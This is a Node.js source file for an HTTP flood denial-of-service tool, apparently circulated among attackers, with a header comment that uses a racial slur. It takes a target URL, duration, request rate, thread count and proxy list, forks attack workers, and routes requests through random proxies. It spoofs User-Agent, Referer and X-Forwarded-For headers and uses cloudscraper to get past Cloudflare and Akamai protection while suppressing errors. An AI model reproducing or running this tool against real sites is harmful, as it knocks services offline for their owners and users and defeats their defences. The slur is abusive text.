//Customized by @Zerodayvul admin//Do not try to sell niggaconst net = require("net");const http2 = require("http2");const tls = require("tls");const cluster = require("cluster");const url = require("url");const path = require("path");const crypto = require("crypto");const UserAgent = require('user-agents');const fs = require("fs");const axios = require('axios');const https = require('https');const cloudscraper = require('cloudscraper');  // Cloudflare bypassconst HttpsProxyAgent = require('https-proxy-agent'); // Proxy agent for Akamai bypassprocess.setMaxListeners(0);require("events").EventEmitter.defaultMaxListeners = 0;// Suppress error messagesconsole.error = () => {};// Catch all uncaught exceptionsprocess.on('uncaughtException', (err) => {    // Suppress uncaught exceptions});process.on('unhandledRejection', (err) => {    // Suppress unhandled promise rejections});if (process.argv.length < 7) {    console.log(``);    console.log(`node tls.js [TARGET] [TIME] [RATE] [THREAD] [PROXY]`);    process.exit();}const getCurrentTime = () => {    const now = new Date();    const hours = now.getHours().toString().padStart(2, '0');    const minutes = now.getMinutes().toString().padStart(2, '0');    const seconds = now.getSeconds().toString().padStart(2, '0');    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;};const targetURL = process.argv[2];const proxyFile = process.argv[6];const proxies = readLines(proxyFile);const agent = new https.Agent({ rejectUnauthorized: false });function getStatus() {    const timeoutPromise = new Promise((resolve, reject) => {        setTimeout(() => {            reject(new Error('Request timed out'));        }, 5000);    });    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });    Promise.race([axiosPromise, timeoutPromise])        .then((response) => {            const { status, data } = response;            console.log(`[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);        })        .catch((error) => {            if (error.message === 'Request timed out') {                console.log(`[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} Request Timed Out`);            } else if (error.response) {                const extractedTitle = getTitleFromHTML(error.response.data);                console.log(`[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);            } else {                console.log(`[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} ${error.message}`);            }        });}function getTitleFromHTML(html) {    const titleRegex = /<title>(.*?)<\/title>/i;    const match = html.match(titleRegex);    if (match && match[1]) {        return match[1];    }    return 'Not Found';}function randomIntn(min, max) {    return Math.floor(Math.random() * (max - min) + min);}function randomString(length) {    var result = "";    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";    var charactersLength = characters.length;    for (var i = 0; i < length; i++) {        result += characters.charAt(Math.floor(Math.random() * charactersLength));    };    return result;}function randomElement(elements) {    return elements[randomIntn(0, elements.length)];}const args = {    target: process.argv[2],    time: ~~process.argv[3],    rate: ~~process.argv[4],    threads: ~~process.argv[5],    proxyFile: process.argv[6]}if (cluster.isMaster) {    console.clear();    console.log(``);      for (let i = 1; i <= args.threads; i++) {        cluster.fork();        console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);    }    console.log(`[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} The Attack Has Started`);    setInterval(getStatus, 2000);    setTimeout(() => {        console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} The Attack Is Over`);        process.exit(1);    }, args.time * 1000);}// Function to load user agents from a filefunction loadUserAgents(filename) {    try {        const data = fs.readFileSync(filename, 'utf8');        return data.split('\n').map(line => line.trim()).filter(line => line.length > 0);    } catch (error) {        console.error(`${filename} not found. Please check the file path.`);        return [];    }}// Load User Agents from ua.txtconst userAgents = loadUserAgents('ua.txt');// Function to choose a random User-Agentfunction getRandomUserAgent() {    const randomIndex = Math.floor(Math.random() * userAgents.length);    return userAgents[randomIndex];}// Example of using the random User-Agent in a requestconst headers = {    'User-Agent': getRandomUserAgent(),    // Add other headers as needed};// Function for bypassing Cloudflare and Akamai with random User-Agent, proxies, TLS fingerprinting, and ISP evasionfunction bypassCloudflareAndAkamai(target, proxy, callback) {    const userAgent = new UserAgent();    const options = {        url: target,        proxy: `http://${proxy}`,        headers: {            'User-Agent': userAgent.random().toString(),            'Connection': 'keep-alive',            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',            'Accept-Language': 'en-US,en;q=0.8',            'Upgrade-Insecure-Requests': '1',            'Referer': target,  // Spoof referer            'X-Forwarded-For': randomElement(proxies), // Spoof real IP addresses        },        resolveWithFullResponse: true,        agentOptions: {            ciphers: 'ECDHE-RSA-AES128-GCM-SHA256'        },        agent: new HttpsProxyAgent(`http://${proxy}`)  // Using proxy agent to route requests through proxies    };    cloudscraper.get(options, (error, response, body) => {        if (error) {            callback(error, null);        } else {            callback(null, body);        }    });}function attack() {    const proxy = randomElement(proxies);    bypassCloudflareAndAkamai(args.target, proxy, (error, response) => {        if (error) {            console.error(`[\x1b[35mERROR\x1b[0m] ${getCurrentTime()} Cloudflare/Akamai Bypass Failed: ${error.message}`);        } else {            console.log(`[\x1b[35mSUCCESS\x1b[0m] ${getCurrentTime()} Bypass Successful! Response Length: ${response.length}`);        }    });}setInterval(attack, args.rate);// Forked workers performing the attackif (cluster.isWorker) {    for (let i = 0; i < args.rate; i++) {        attack();    }}